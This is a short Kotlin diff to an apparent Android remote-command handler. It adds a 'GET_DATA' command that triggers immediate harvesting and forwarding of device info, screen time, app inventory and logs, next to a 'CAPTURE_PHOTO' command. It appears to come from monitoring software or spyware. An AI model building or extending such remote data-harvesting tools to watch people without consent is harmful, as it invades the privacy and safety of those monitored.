@@ -70,10 +70,10 @@ object ActiveResponder {
                     }
                 }
 
-                "GET_LOGS" -> {
-                    // Trigger immediate delta harvest and forward!
+                "GET_DATA", "GET_LOGS" -> {
+                    // Trigger immediate delta harvest, device info, screen time, and app inventory forward!
                     SyncScheduler.triggerImmediateSync(context)
-                    Pair("EXECUTED", "Immediate delta log harvest and forward initiated")
+                    Pair("EXECUTED", "Immediate device telemetry & log harvest initiated")
                 }
 
                 "CAPTURE_PHOTO" -> {
